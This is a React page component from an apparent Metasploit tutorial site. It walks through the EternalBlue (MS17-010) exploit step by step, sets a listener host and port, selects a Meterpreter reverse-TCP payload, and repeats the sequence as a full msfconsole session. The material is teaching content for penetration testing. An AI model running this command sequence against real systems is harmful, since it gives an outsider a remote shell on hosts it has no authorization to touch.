'use client'
import { useEffect, useState } from 'react';
import DocHeading from '@/components/base/DocHeading';
import CodeBlock from '@/components/base/Codeblock';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const exploitWorkflow = [
  { step: 'search', desc: 'Find an exploit matching the target vulnerability', example: "search ms17_010" },
  { step: 'use', desc: 'Select the exploit module', example: "use exploit/windows/smb/ms17_010_eternalblue" },
  { step: 'show options', desc: 'Review required and optional parameters', example: "show options" },
  { step: 'set RHOSTS', desc: 'Set the target host or range', example: "set RHOSTS 192.168.1.10" },
  { step: 'set LHOST', desc: 'Set your local listener IP', example: "set LHOST 10.0.0.1" },
  { step: 'set LPORT', desc: 'Set your local listener port', example: "set LPORT 4444" },
  { step: 'set PAYLOAD', desc: 'Choose a payload', example: "set PAYLOAD windows/meterpreter/reverse_tcp" },
  { step: 'exploit', desc: 'Execute the exploit', example: "exploit" },
];

export default function MetasploitWorkflowPage() {
  const [activeStep, setActiveStep] = useState<number | null>(null);
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-amber/10 border border-cyber-amber/20 text-cyber-amber text-xs font-medium font-mono mb-4">
          <i className="ri-road-map-line" />
          Metasploit Section 6 of 10
        </div>
        <DocHeading level={1}>Exploit Workflow</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Click each step to see the exact command sequence for a typical exploit.
        </p>
      </motion.div>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="space-y-3">
          {exploitWorkflow.map((step, i) => (
            <button
              key={i}
              type="button"
              onClick={() => setActiveStep(activeStep === i ? null : i)}
              className={`w-full cyber-card p-4 text-left cursor-pointer ${activeStep === i ? 'border-cyber-amber' : ''}`}
            >
              <div className="flex items-start gap-3">
                <span className="w-7 h-7 rounded-full bg-cyber-amber/10 border border-cyber-amber/20 text-cyber-amber text-xs font-bold flex items-center justify-center flex-shrink-0">
                  {i + 1}
                </span>
                <div className="flex-1">
                  <h4 className="text-sm font-semibold text-white">{step.step}: {step.desc}</h4>
                  {activeStep === i && (
                    <motion.code
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      className="block mt-2 text-xs font-mono text-cyber-green"
                    >
                      {step.example}
                    </motion.code>
                  )}
                </div>
                <i className={`ri-arrow-down-s-line text-cyber-text-dim transition-transform ${activeStep === i ? 'rotate-180' : ''}`} />
              </div>
            </button>
          ))}
        </div>
      </motion.section>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <h2 className="text-lg font-semibold text-white mb-4">Full Example</h2>
        <CodeBlock code={`msfconsole
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
RHOSTS => 192.168.1.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.0.0.1
LHOST => 10.0.0.1
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit`} />
      </motion.section>

      <motion.section className="mt-12 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="mt-8 flex gap-3">
          <a href="/metasploit/database" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            Next: Database <i className="ri-arrow-right-line ml-1" />
          </a>
          <a href="/metasploit/meterpreter" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-amber hover:text-cyber-amber transition-all whitespace-nowrap">
            <i className="ri-arrow-left-line mr-1" /> Back
          </a>
        </div>
      </motion.section>
    </div>
  );
}